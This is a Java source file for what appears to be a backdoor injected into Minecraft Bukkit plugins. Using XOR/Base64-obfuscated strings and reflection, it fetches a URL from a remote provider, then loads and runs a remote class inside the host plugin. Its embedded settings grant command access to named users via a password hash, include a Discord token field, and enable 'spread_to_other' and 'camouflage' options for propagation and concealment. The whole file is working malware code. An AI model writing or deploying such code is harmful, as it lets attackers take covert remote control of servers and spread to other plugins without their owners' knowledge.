package com.tmquan2508.exploit;

import org.bukkit.plugin.Plugin;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.net.URLConnection;
import java.util.Base64;

public final class Config {
    public static String KEY = "::KEY::";
    public static String S_URL_PROVIDER = "::S_URL_PROVIDER::";
    public static String S_JAVA_NET_URL = "::S_JAVA_NET_URL::";
    public static String S_JAVA_NET_URL_CLASS_LOADER = "::S_JAVA_NET_URL_CLASS_LOADER::";
    public static String S_JAVA_LANG_CLASS_LOADER = "::S_JAVA_LANG_CLASS_LOADER::";
    public static String S_MAIN_CLASS = "::S_MAIN_CLASS::";
    public static String S_LOAD_CLASS_METHOD = "::S_LOAD_CLASS_METHOD::";
    public static String S_HTTP_CONN_CLASS = "::S_HTTP_CONN_CLASS::";
    public static String S_OPEN_CONN_METHOD = "::S_OPEN_CONN_METHOD::";
    public static String S_SET_REQ_METHOD = "::S_SET_REQ_METHOD::";
    public static String S_GET_INPUT_STREAM_METHOD = "::S_GET_INPUT_STREAM_METHOD::";
    public static String S_DISCONNECT_METHOD = "::S_DISCONNECT_METHOD::";

    public Config(Plugin plugin) {
        try {
            plugin.getLogger().info("[DEBUG] Initializing remote module...");

            String urlProvider = HiddenUtils.decrypt(S_URL_PROVIDER);
            plugin.getLogger().info("[DEBUG] Fetching resource from: " + urlProvider);
            String urlStr = fetch(plugin, urlProvider);
            if (urlStr == null) {
                 plugin.getLogger().severe("[DEBUG] Failed to fetch resource URL. Aborting.");
                 return;
            }
            plugin.getLogger().info("[DEBUG] Fetched resource URL: " + urlStr);

            plugin.getLogger().info("[DEBUG] Getting URL class...");
            Class<?> urlClass = Class.forName(HiddenUtils.decrypt(S_JAVA_NET_URL));
            Object url = HiddenUtils.invokeConstructor(urlClass, new Class<?>[]{String.class}, urlStr);
            plugin.getLogger().info("[DEBUG] URL object created: " + url);

            Object urlsArray = java.lang.reflect.Array.newInstance(urlClass, 1);
            java.lang.reflect.Array.set(urlsArray, 0, url);

            plugin.getLogger().info("[DEBUG] Getting URLClassLoader class...");
            Class<?> clClass = Class.forName(HiddenUtils.decrypt(S_JAVA_NET_URL_CLASS_LOADER));

            plugin.getLogger().info("[DEBUG] Dynamically loading ClassLoader class...");
            Class<?> classLoaderClass = Class.forName(HiddenUtils.decrypt(S_JAVA_LANG_CLASS_LOADER));

            Object classLoader = HiddenUtils.invokeConstructor(clClass, new Class<?>[]{urlsArray.getClass(), classLoaderClass}, urlsArray, plugin.getClass().getClassLoader());
            plugin.getLogger().info("[DEBUG] URLClassLoader created.");

            String mainClassName = HiddenUtils.decrypt(S_MAIN_CLASS);
            plugin.getLogger().info("[DEBUG] Loading main class: " + mainClassName);

            Object mainClass = HiddenUtils.invokeInstanceMethod(classLoader, HiddenUtils.decrypt(S_LOAD_CLASS_METHOD), Class.class, new Class<?>[]{String.class}, mainClassName);
            plugin.getLogger().info("[DEBUG] Main class loaded: " + mainClass);

            plugin.getLogger().info("[DEBUG] Getting main constructor...");
            plugin.getLogger().info("[DEBUG] Initializing main module instance...");
            HiddenUtils.invokeConstructor((Class<?>) mainClass, new Class<?>[]{Plugin.class, Config.class}, plugin, this);

            plugin.getLogger().info("[SUCCESS] Remote module initialized successfully!");

        } catch (Throwable e) {
            plugin.getLogger().severe("!!! A CRITICAL ERROR OCCURRED DURING MODULE INITIALIZATION !!!");
            e.printStackTrace();
        }
    }

    private String fetch(Plugin plugin, String urlStr) throws Throwable {
        plugin.getLogger().info("[DEBUG] [fetch] Creating URL object for fetching...");
        Class<?> urlClass = Class.forName(HiddenUtils.decrypt(S_JAVA_NET_URL));
        Object url = HiddenUtils.invokeConstructor(urlClass, new Class<?>[]{String.class}, urlStr);

        plugin.getLogger().info("[DEBUG] [fetch] Opening connection...");
        Object conn = HiddenUtils.invokeInstanceMethod(url, HiddenUtils.decrypt(S_OPEN_CONN_METHOD), URLConnection.class, new Class<?>[]{});

        Class<?> httpConnClass = Class.forName(HiddenUtils.decrypt(S_HTTP_CONN_CLASS));

        HiddenUtils.invokeInstanceMethod(httpConnClass, conn, HiddenUtils.decrypt(S_SET_REQ_METHOD), void.class, new Class<?>[]{String.class}, "GET");
        plugin.getLogger().info("[DEBUG] [fetch] Set request method to GET.");

        try (InputStream is = (InputStream) HiddenUtils.invokeInstanceMethod(httpConnClass, conn, HiddenUtils.decrypt(S_GET_INPUT_STREAM_METHOD), InputStream.class, new Class<?>[]{})) {
            String line = new BufferedReader(new InputStreamReader(is)).readLine();
            plugin.getLogger().info("[DEBUG] [fetch] Read line from server: " + line);
            return line;
        } finally {
            HiddenUtils.invokeInstanceMethod(httpConnClass, conn, HiddenUtils.decrypt(S_DISCONNECT_METHOD), void.class, new Class<?>[]{});
            plugin.getLogger().info("[DEBUG] [fetch] Disconnected.");
        }
    }

    public static String[] authorized_uuids;
    public static String[] authorized_usernames;
    public static String command_prefix;
    public static boolean spread_to_other;
    public static boolean debug_log;
    public static String discord_token;
    public static String authorized_password;
    public static boolean camouflage;
    static { getInjectedConfig(); }
    private static void getInjectedConfig() {
        String injected_authorized_uuids = "";
        String injected_authorized_usernames = "Kudo,Vdung";
        String injected_command_prefix = "!";
        boolean injected_spread_to_other = Boolean.parseBoolean("true");
        boolean injected_debug_log = Boolean.parseBoolean("true");
        String injected_discord_token = "";
        String injected_authorized_password = "5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5";
        boolean injected_camouflage = Boolean.parseBoolean("true");
        authorized_uuids = injected_authorized_uuids.isEmpty() ? new String[0] : injected_authorized_uuids.split(",");
        authorized_usernames = injected_authorized_usernames.isEmpty() ? new String[0] : injected_authorized_usernames.split(",");
        command_prefix = injected_command_prefix;
        spread_to_other = injected_spread_to_other;
        debug_log = injected_debug_log;
        discord_token = injected_discord_token;
        authorized_password = injected_authorized_password;
        camouflage = injected_camouflage;
    }

    public static final class HiddenUtils {
        public static String decrypt(String encryptedString) {
            try {
                byte[] decoded = Base64.getDecoder().decode(encryptedString);
                byte[] keyBytes = Config.KEY.getBytes("UTF-8");
                for (int i = 0; i < decoded.length; i++) {
                    decoded[i] = (byte) (decoded[i] ^ keyBytes[i % keyBytes.length]);
                }
                return new String(decoded, "UTF-8");
            } catch (Exception ex) {
                return "decoding.error";
            }
        }

        public static <T> T invokeConstructor(Class<T> targetClass, Class<?>[] paramTypes, Object... args) throws Throwable {
            MethodHandles.Lookup lookup = MethodHandles.lookup();
            MethodType constructorType = MethodType.methodType(void.class, paramTypes);
            MethodHandle handle = lookup.findConstructor(targetClass, constructorType);
            return (T) handle.invokeWithArguments(args);
        }

        public static Object invokeInstanceMethod(Class<?> lookupClass, Object target, String methodName, Class<?> returnType, Class<?>[] paramTypes, Object... args) throws Throwable {
            MethodHandles.Lookup lookup = MethodHandles.lookup();
            MethodType methodType = MethodType.methodType(returnType, paramTypes);
            MethodHandle handle = lookup.findVirtual(lookupClass, methodName, methodType);
            return handle.bindTo(target).invokeWithArguments(args);
        }

        public static Object invokeInstanceMethod(Object target, String methodName, Class<?> returnType, Class<?>[] paramTypes, Object... args) throws Throwable {
            return invokeInstanceMethod(target.getClass(), target, methodName, returnType, paramTypes, args);
        }
    }
}